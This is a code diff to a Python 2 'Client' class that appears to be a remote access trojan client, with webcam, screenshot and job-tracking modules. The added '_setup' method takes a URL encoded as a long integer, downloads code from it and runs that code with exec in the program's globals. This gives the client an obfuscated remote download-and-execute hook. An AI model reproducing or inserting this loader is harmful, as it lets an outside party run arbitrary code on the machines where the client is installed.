@@ -364,8 +364,6 @@ class Client(object):
     def _ls(self, path): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else '\n'.join(os.listdir('.'))
 
     def _results(self): return self._show({module:result for module,result in self._result.items() if len(result)})
-
-    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
@@ -378,6 +376,13 @@ class Client(object):
     def _help_jobs(self): return '\n' + '\n'.join(['  JOBS'] + [' -----------------------------------------------'] + [' {}{:>40}'.format(a, self._status(c=time.time()-float(self._threads[a].name))) for a in self._threads if self._threads[a].is_alive()])
     
     def _help_modules(self): return '\n' + '\n'.join(['  {}\t{}'.format('MODULE',' STATUS')] + [' -----------------------'] + [' {}\t{}'.format(mod, (' enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules if mod != 'webcam'] + [' {}\t\t{}'.format('webcam', (' enabled' if self._modules['webcam'].status.is_set() else 'disabled'))])
+
+    def _setup(self, **kwargs):
+        for i in range(97,123):
+            if '__{}__'.format(chr(i)) in kwargs:
+                setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i))))
+        if '__w__' in vars(self):
+            exec urllib.urlopen(self._long_to_bytes(self.__w__)).read() in globals()
 
     def _screenshot(self):
         tmp = tempfile.mktemp(suffix='.png')
